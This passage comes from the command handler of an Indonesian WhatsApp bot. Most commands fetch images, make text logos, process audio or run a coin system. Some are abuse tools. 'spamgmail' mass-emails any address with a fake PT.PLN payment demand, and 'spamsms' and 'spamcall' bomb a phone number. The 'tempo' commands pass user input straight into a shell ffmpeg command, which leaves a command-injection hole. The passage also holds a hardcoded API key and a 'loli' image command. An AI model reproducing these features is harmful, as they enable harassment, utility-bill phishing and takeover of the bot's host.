				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/estetik?apikey=${leysKey}`, {method: 'get'})
				buffer = await getBuffer(anu.result)
				zacky.sendMessage(from, buffer, image, {quoted: mek, caption: '*JAN LUPA SUKREP Manik*'})
				await limitAdd(sender)
				break
				    case 'ppcouple':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})

				if (isLimit(sender)) return reply(ind.limitend(pusname))

				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/ppcouple?apikey=${leysKey}`, {method: 'get'})
				laki = await getBuffer(anu.result.male)
				zacky.sendMessage(from, laki, image, {quoted: mek, caption: '*JAN LUPA SUKREP Manik*'})
				cewe = await getBuffer(anu.result.female)
				zacky.sendMessage(from, cewe, image, {quoted: mek, caption: '*JAN LUPA SUKREP Manik*'})
				await limitAdd(sender)
				break
case 'anime':
  case 'animerandom':
				  if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				anu = await fetchJson(`https://leyscoders-api.herokuapp.com/api/random-nimek?apikey=${leysKey}`, {method: 'get'})
				animee = await getBuffer(anu.result)
				zacky.sendMessage(from, animee, image, {quoted: mek, caption: '*JAN LUPA SUKREP Manik*'})
				await limitAdd(sender)
				break
				    case 'transfer':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (!q.includes('|')) return  reply(ind.wrongf())
                const tujuan = q.substring(0, q.indexOf('|') - 1)
                const jumblah = q.substring(q.lastIndexOf('|') + 1)
                if(isNaN(jumblah)) return await reply('jumlah harus berupa angka!!')
                if (jumblah < 100 ) return reply(`minimal transfer 100`)
                if (checkATMuser(sender) < jumblah) return reply(`uang mu tidak mencukupi untuk melakukan transfer`)
                const tujuantf = `${tujuan.replace("@", '')}@s.whatsapp.net`
                fee = 0.005 *  jumblah
                hasiltf = jumblah - fee
                addKoinUser(tujuantf, hasiltf)
                confirmATM(sender, jumblah)
                addKoinUser('6285737134572@s.whatsapp.net', fee)
                reply(`*「 SUKSES 」*\n\npengiriman uang telah sukses\ndari : +${sender.split("@")[0]}\nke : +${tujuan}\njumblah transfer : ${jumblah}\npajak : ${fee}`)
                break
				    case 'limit':
				   if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				   checkLimit(sender)
					break

				case 'buylimit':
				if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (args.length < 1) return reply('mau beli berapa?')
				payout = body.slice(10)
				const koinPerlimit = 500
				const total = koinPerlimit * payout
				if ( checkATMuser(sender) <= total) return reply(`MAAF UANG KAMU BELUM CUKUP, JIKA INGIN MELIHAT UANG KETIK ${prefix}dompet`)
				if ( checkATMuser(sender) >= total ) {
					confirmATM(sender, total)
					bayarLimit(sender, payout)
					await reply(`*PEMBELIAN BERHASIL*\n\n*pengirim* : ManikBot\n*penerima* : ${pushname}\n*nominal pembelian* : ${payout} \n *harga limit* : ${koinPerlimit}/limit\n *sisa uang mu* : ${checkATMuser(sender)}\n\nproses berhasil dengan nomer pembayaran\n${createSerial(15)}`)
				} 
				break
				    case 'gtavposter':
case 'pencil':
case 'pencildrawing':
case 'burneffect':
case 'crossgun':
case 'customwp':
case 'nightbeach':
case 'raindrop':
case '3dlinephoto':
  
var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
    urlgambar = args[0]
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  nikhmmp = await getBuffer(`https://videfikri.com/api/textmaker/${command}/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, nikhmmp, image, {quoted:mek})
	} else {
	  	  reply(`reply atau kirim gambar dengan caption ${prefix + command}`)
	}
	break
	case 'comunism':
	  case 'trigger':
	    case 'rotate':
	      case 'tobecontinue':
	        case 'thuglife':
var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
    urlgambar = args[0]
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  nikhmmp = await getBuffer(`http://zekais-api.herokuapp.com/${command}?url=${anu.display_url}`)
	 zacky.sendMessage(from, nikhmmp, image, {quoted:mek})
	} else {
	  reply(`reply atau kirim gambar dengan caption ${prefix + command}`)
	}
	break
	case 'tomp3':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                	zacky.updatePresence(from, Presence.composing) 
					if (!isQuotedVideo) return reply('❌ reply videonya ❌')
					reply(ind.wait())
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ Gagal, pada saat mengkonversi video ke mp3 ❌')
						buffer = fs.readFileSync(ran)
						zacky.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break				   
case 'readallchat':
   case 'readall':
      case 'rall':
				const readallid = await zacky.chats.all()
			zacky.setMaxListeners(25)
				for (let xyz of readallid) {
					await zacky.chatRead(xyz.jid)
				}
		      zacky.sendMessage(from, `Sukses!`, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": "Berhasil membaca semua chat!", 'jpegThumbnail': fs.readFileSync('./src/Ivan.jpg')}}}})
break

case 'fast':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftoko})
						fs.unlinkSync(ran)
					})
					break
					case 'gemes':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo

					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=50000" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
					zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftoko})
						fs.unlinkSync(ran)
					})
					break
case 'tempo':
   var req = args.join(' ')            
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftoko})
						fs.unlinkSync(ran)
					})
				break
				    case 'nightcore':
	                 if (!isQuotedAudio) return reply('Reply audio nya om')
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftoko,duration:99999999999999999999999})
						fs.unlinkSync(ran)
					   })
				       break 
				       case 'getpic':
					if (args.length < 1) return 
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Siap Boss')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
						try {
						pp = await zacky.getProfilePicture(mentioned)
						buffer = await getBuffer(pp)
						
						zacky.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					} catch (err) {
						zacky.sendMessage(from, buffer, image, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
					}
				break
				    case 'tempo-v':
   var req = args.join(' ')            
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, video, { mimetype: 'video/mp4', quoted: ftoko })
})
				break
				    case 'imut':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=3/4,asetrate=44500*4/3 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
						fs.unlinkSync(ran)
					})
				break
				    case 'hode':
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await zacky.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${media} -af atempo=4/3,asetrate=44500*3/4 ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(media)
						if (err) return reply('Error!')
						hah = fs.readFileSync(ran)
						zacky.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fdoc})
						fs.unlinkSync(ran)
					})
				break                                                                                            

		case 'rules':
                    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (isBanned) return reply('Lu sudah terbenned!')				
nehh = `0ཻུ۪۪ꦽꦼ̷⸙‹•══════════════♡᭄
│  ${uwu}☬ PERATURAN BOT ☬${uwu}
│
│1. DILARANG TELFON BOT!!
│2. DILARANG SPAM BOT
│3. DILARANG BERKATA KASAR
│4. DILARANG SPAM VIRTEX
│5. DILARANG TELEFON OWNER
│6. DILARANG SPAM GROUP
│7. DILARANG SPAM ADMIN
│8. DILARANG BERKATA KASAR DI
│   GC
│
│ *JIKA KALIAN MELANGGAR...
│ *AKAN DI BLOCK + BANNED!!*
╰═════ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙═════`
    buttons = [{buttonId:`${prefix}menu`,buttonText:{displayText: '⋮☰ MENU'},type:1},
               {buttonId:`${prefix}owner`,buttonText:{displayText: '👤 OWNER'},type:1}]                       
               imageMsg = (await zacky.prepareMessageMedia(fs.readFileSync('./lib/◇.jpeg'), 'imageMessage', {thumbnail: fs.readFileSync('./lib/◇.jpeg')})).imageMessage
               buttonsMessage = {
               contentText: `${nehh}`,
               footerText: `${wib} WIB\n${day} - ${myMonths[bulan]} - ${year}\n\n© ${creator}`,
               imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
               }
               prep = await zacky.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply, contextInfo: {forwardingScore: 1000, isForwarded: true}})
               zacky.relayWAMessage(prep)
               break
                    case 'tahta':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isLimit(sender)) return reply(ind.limitend(pusname))
if (args.length < 1) return reply(`Contoh : ${prefix}tahta ManikBot`)
buffer = await getBuffer(`http://zekais-api.herokuapp.com/hartatahta?text=${body.slice(7)}`)
zacky.sendMessage(from, buffer, image, {quoted: mek})
await limitAdd(sender)
break
case 'minato':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Minato`, {method: 'get'})
min = JSON.parse(JSON.stringify(anu));
					ato =  min[Math.floor(Math.random() * min.length)];
					nye = await getBuffer(ato)
					zacky.sendMessage(from, nye, image, { caption: 'minato!!', quoted: mek })
					await limitAdd(sender)
					break
case 'kucing':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Kucing`, {method: 'get'})
										ku = JSON.parse(JSON.stringify(anu));
					ci =  ku[Math.floor(Math.random() * ku.length)];
					nye = await getBuffer(ci)
					zacky.sendMessage(from, nye, image, { caption: 'kucing', quoted: mek })
					await limitAdd(sender)
					break
					case 'aot':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+attack+on+titan`, {method: 'get'})
					ti = JSON.parse(JSON.stringify(anu));
					tan =  ti[Math.floor(Math.random() * ti.length)];
					nye = await getBuffer(tan)
					zacky.sendMessage(from, nye, image, { caption: '*JAN LUPA SUKREP Manik*', quoted: mek })
					await limitAdd(sender)
					break
					case 'tokyoghoul':
         if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Anime+Tokyo+Ghoul`, {method: 'get'})
						tokyo = JSON.parse(JSON.stringify(anu));
					ghoul =  tokyo[Math.floor(Math.random() * tokyo.length)];
					nye = await getBuffer(ghoul)
					zacky.sendMessage(from, nye, image, { caption: 'JAN LUPA SUKREP Manik', quoted: mek })
					await limitAdd(sender)
					break
					case 'sagiri':
         if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+Izumi+Sagiri`, {method: 'get'})
						sag = JSON.parse(JSON.stringify(anu));
					iri =  sag[Math.floor(Math.random() * sag.length)];
					nye = await getBuffer(iri)
					zacky.sendMessage(from, nye, image, { caption: 'SAGIRI CHAN', quoted: mek })
					await limitAdd(sender)
					break
					case 'cantik':
					  case 'cans':
					case 'cecen':
					  case 'cecan':
         if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Cewe+Cantik`, {method: 'get'})
						ce = JSON.parse(JSON.stringify(anu));
					cen =  ce[Math.floor(Math.random() * ce.length)];
					nye = await getBuffer(cen)
					zacky.sendMessage(from, nye, image, { caption: 'PUNYAKU KAWAN', quoted: mek })
					await limitAdd(sender)
					break
					case 'cogan':
					    case 'tampan':
         if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Orang+Ganteng`, {method: 'get'})
						cog = JSON.parse(JSON.stringify(anu));
					an =  cog[Math.floor(Math.random() * cog.length)];
					nye = await getBuffer(an)
					zacky.sendMessage(from, nye, image, { caption: 'GANTENG SEPERTI SAYA', quoted: mek })
					await limitAdd(sender)
					break
					case 'chika':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=FujiwaraChika`, {method: 'get'})
					chi = JSON.parse(JSON.stringify(anu));
					ka =  chi[Math.floor(Math.random() * chi.length)];
					nye = await getBuffer(ka)
					zacky.sendMessage(from, nye, image, { caption: '*CHIKA-SAN*', quoted: mek })
					await limitAdd(sender) 
					break
				    case 'kurumi':
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+karumi`, {method: 'get'})
					kur = JSON.parse(JSON.stringify(anu));
					imi =  kur[Math.floor(Math.random() * kur.length)];
					nye = await getBuffer(imi)
					zacky.sendMessage(from, nye, image, { caption: '*kurumi-chan*', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'kaneki':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=kaneki`, {method: 'get'})
					kan = JSON.parse(JSON.stringify(anu));
					eki =  kan[Math.floor(Math.random() * kan.length)];
					nye = await getBuffer(eki)
					zacky.sendMessage(from, nye, image, { caption: '*KANEKI*', quoted: mek })
					await limitAdd(sender) 
					break 
				case 'touka':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=anime+touka`, {method: 'get'})
					tou = JSON.parse(JSON.stringify(anu));
					ka =  tou[Math.floor(Math.random() * tou.length)];
					nye = await getBuffer(ka)
					zacky.sendMessage(from, nye, image, { caption: '*TOUKA*', quoted: mek })
					await limitAdd(sender) 
					break 
case 'neko':
  case 'nekonime':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Anime+Neko`, {method: 'get'})
										ne = JSON.parse(JSON.stringify(anu));
					ko =  ne[Math.floor(Math.random() * ne.length)];
					nye = await getBuffer(ko)
					zacky.sendMessage(from, nye, image, { caption: 'NIH NEKO MU', quoted: mek })
					await limitAdd(sender)
					break
case 'naruto':
if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Naruto`, {method: 'get'})
										naru = JSON.parse(JSON.stringify(anu));
					to =  naru[Math.floor(Math.random() * naru.length)];
					nye = await getBuffer(to)
					zacky.sendMessage(from, nye, image, { caption: 'naruto!!', quoted: mek })
					await limitAdd(sender)
					break
case 'loli':
          if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						anu = await fetchJson(`https://api.fdci.se/rep.php?gambar=Anime+Loli`, {method: 'get'})
					lo = JSON.parse(JSON.stringify(anu));
					li =  lo[Math.floor(Math.random() * lo.length)];
					nye = await getBuffer(li)
					zacky.sendMessage(from, nye, image, { caption: 'Loli', quoted: mek })
					await limitAdd(sender)
					break
			case 'waifu':
				    try {
				      if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						axios.get(`https://nekos.life/api/v2/img/kemonomimi`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
					zacky.sendMessage(from, buf, image, {quoted: mek,caption: "KAWAII!!"})
					})})
					} catch (err) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
await limitAdd(sender) 

					break
					case 'lizard':
             try {
				      if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
						axios.get(`https://nekos.life/api/v2/img/lizard`).then((res)=>{
						imageToBase64(res.data.url).then((response) => {var buf = Buffer.from(response, 'base64');
					zacky.sendMessage(from, buf, image, {quoted: mek,caption: "ManikBot"})
					})})
					} catch (err) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERROR* ❌')
					}
         await limitAdd(sender) 
					break
				
case 'asupan':
                if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
                anu = await getBuffer(`https://api.xteam.xyz/shitpost?APIKEY=${xteamkey}`)
                zacky.sendMessage(from, anu, video, {mimetype: 'video/mp4', filename: `asupan_bangsa.mp4`, quoted: mek, caption: 'asupannya'})
                await limitAdd(sender) 
                break
                case 'bucin':
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
						hasil = bucinrandom[Math.floor(Math.random() * (bucinrandom.length))]
						zacky.sendMessage(from, '*'+hasil+'*', text, {quoted: mek})
						await limitAdd(sender)
					break
				
                case 'porncomen':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (args.length < 1) return reply(ind.wrongf())
           if (args.length < 1) return reply('textnya mana?')
					mgs = body.slice(11)
pub = await getBuffer(`https://api.zeks.xyz/api/phub?apiKey=${ZeksApi}&img=https://1.bp.blogspot.com/-x8KhcOBG-yw/XiU4pi1yWVI/AAAAAAAADBA/gK8tsLyc1lQ808A348IKzDCjf6fUBKONwCLcBGAsYHQ/s1600/cara%2Bbuat%2Bfoto%2Bprofil%2Bdi%2Bwhatsapp%2Bmenjadi%2Bunik.jpg&username=ManikBot&msg=${mgs}`)
zacky.sendMessage(from, pub, image, {caption: 'PORNHUB COMMENT', quoted: mek})

					await limitAdd(sender)

					break
					case 'tumur':
					query = args.join(" ")
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
           if (args.length < 1) return reply('yang mau di tebak umurnya siapa?')
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebakumur?apiKey=${lolkey}&name=${body.slice(7)}`, {method: 'get'})
				result =	`Nama = ${anu.result.name}\nUmur = ${anu.result.age}`
					zacky.sendMessage(from, result, text, {quoted: mek})
					await limitAdd(sender)
					break
					
				case 'tlight':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (args.length < 1) return reply(ind.wrongf())
           if (args.length < 1) return reply('textnya mana?')
				nik056 = body.slice(8)
					nik056 = await getBuffer(`https://api.zeks.xyz/api/tlight?text=${nik056}&apiKey=${ZeksApi}`)
					zacky.sendMessage(from, nik056, image, {caption: 'Light Text', quoted: mek})
					await limitAdd(sender)
					break
					case 'gtext':
                 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (args.length < 1) return reply(ind.wrongf())
           if (args.length < 1) return reply('textnya mana?')
					gte = `${body.slice(7)}`
					te1 = gte.split("|")[0];
					te2 = gte.split("|")[1];
					gte = await getBuffer(`https://api.zeks.xyz/api/gtext?text1=${te1}&text2=${te2}&apikey=${ZeksApi}`)
					zacky.sendMessage(from, gte, image, {caption: 'Glitch Text', quoted: mek})
					await limitAdd(sender)
					break 
					case 'coffee':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply('textnya mana?')
					reply('*Harga = 50.000*')
					Manik = await getBuffer(`https://videfikri.com/api/textmaker/coffeecup2/?text=${body.slice(8)}`)
					zacky.sendMessage(from, Manik, image, {caption: 'jangan lupa untuk selalu tersenyum', quoted: mek})
					await limitAdd(sender)
					break
					case 'breakwall':
					case 'matrix':
					case 'bneon':
					case 'text3dbox':
if (args.length == 0) return reply(`Example: ${prefix + command} ManikBot`)
                    textm = args.join(" ")
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?apikey=${ZeksApi}&text=${textm}`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
                    case 'leavest':
                      case 'logobp':
if (args.length == 0) return reply(`Example: ${prefix + command} ManikBot`)
                    textm = args.join(" ")
                    buffer = await getBuffer(`https://api.zeks.xyz/api/${command}?text=${textm}&apikey=${ZeksApi}`)
                    zacky.sendMessage(from, buffer, image, { quoted: mek})
                    break
					case 'shadowt':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply(ind.wrongf())
					anbot = await getBuffer(`https://videfikri.com/api/textmaker/shadowtext/?text=${body.slice(9)}`)
					zacky.sendMessage(from, anbot, image, {caption: 'SHADOW TEXT', quoted: mek})
					await limitAdd(sender)
					break 
                    case 'spamgmail':
                    if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
                    if (args.length == 0) return reply(`Usage: ${prefix + command} query\nExample: ${prefix + command} contoh@gmail.com`)
			if (isLimit(sender)) return reply(limitend(pushname2))
			spam = `${body.slice(10)}`
			anu = await fetchJson(`https://videfikri.com/api/spamemail/?email=${spam}&subjek=PT.PLN&pesan=Silahkan%20bayar%20tagihan%20listrik%20Anda%20sebesar%20500000%20Ribu%20Rupiah%20ya`, {method: 'get'})
			zacky.sendMessage(from, `${anu.result.log_lengkap}`, text, {quoted: mek})
			await limitAdd(sender)
                    break
					case 'spamsms':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
          reply('Wait..')
      nomor = `${body.slice(8)}`
			anu = await fetchJson(`https://alfians-api.herokuapp.com/api/spamsms?no=${nomor}&jum=20`, {method: 'get'})
			zacky.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek})
await limitAdd(sender)
break
					case 'spamcall':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
          reply('Wait..')
      call = `${body.slice(10)}`
			anu = await fetchJson(`https://videfikri.com/api/call/?nohp=${call}`, {method: 'get'})
			zacky.sendMessage(from, `${anu.result.logs}`, text, {quoted: mek})
        await limitAdd(sender)
                     break
    
					case 'pornhub':
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (args.length < 1) return reply(ind.wrongf())
					porn = `${body.slice(8)}`
					hub1 = porn.split("|")[0];
					hub2 = porn.split("|")[1];
					porn = await getBuffer(`https://api.xteam.xyz/textpro/ph?text=${hub1}&text2=${hub2}&APIKEY=${xteamkey}`)
					zacky.sendMessage(from, porn, image, {caption: 'PORNHUB', quoted: mek})
					await limitAdd(sender)
					break 
					case 'smoke':
					case 'camuflage':
					case 'stars':
					case '3dglowing':
					case 'underwaterocean':
					case 'wolfmetal':
					case 'rainbowshine':
                    if (args.length == 0) return reply(`Example: ${prefix + command} ManikBot`)
                    teka = args.join(" ")
                    Manikpur = await getBuffer(`https://api.xteam.xyz/photooxy/${command}?text=${teka}&APIKEY=${xteamkey}`)
                    zacky.sendMessage(from, Manikpur, image, { quoted: mek})
                    break
			case 'husbu':
				zacky.updatePresence(from, Presence.composing) 
				if (isLimit(sender)) return reply(ind.limitend(pusname))
					if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					 data = fs.readFileSync('./src/husbu.js');
        		         jsonData = JSON.parse(data);
		                 rannikdex = Math.floor(Math.random() * jsonData.length);
		                 randKey = jsonData[rannikdex];
		                hasil = await getBuffer(randKey.image)
		                sendImage(hasil, mek, randKey.teks)
					await limitAdd(sender)
				break

		case 'darkneon':
			  if (isLimit(sender)) return reply(ind.limitend(pusname))
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			if (args.length < 1) return reply(`Contoh: ${prefix}darkneon Manik`)
			darkn = body.slice(9)
			darkne = await getBuffer(`https://videfikri.com/api/textmaker/darkneon/?text=${darkn}`)
			zacky.sendMessage(from, darkne, image, {quoted: mek, caption: 'DARKNEON'})
			await limitAdd(sender)
			break
			case 'woodblock':
			  if (isLimit(sender)) return reply(ind.limitend(pusname))
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			if (args.length < 1) return reply(`Contoh: ${prefix}woodblock Manik`)
		 Manik120 = body.slice(11)
			nik120 = await getBuffer(`https://videfikri.com/api/textmaker/woodblock/?text=${Manik120}`)
			zacky.sendMessage(from, nik120, image, {quoted: mek, caption: 'INI'})
			await limitAdd(sender)
			break
			case 'paper':
			  if (isLimit(sender)) return reply(ind.limitend(pusname))
			if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
			if (args.length < 1) return reply(`Contoh: ${prefix}paper Manik`)
			papg = body.slice(6)
			glass = await getBuffer(`https://videfikri.com/api/textmaker/paperonglass/?text=${papg}`)
			zacky.sendMessage(from, glass, image, {quoted: mek, caption: 'INI'})
			await limitAdd(sender)
			break
			case 'ytmp3':
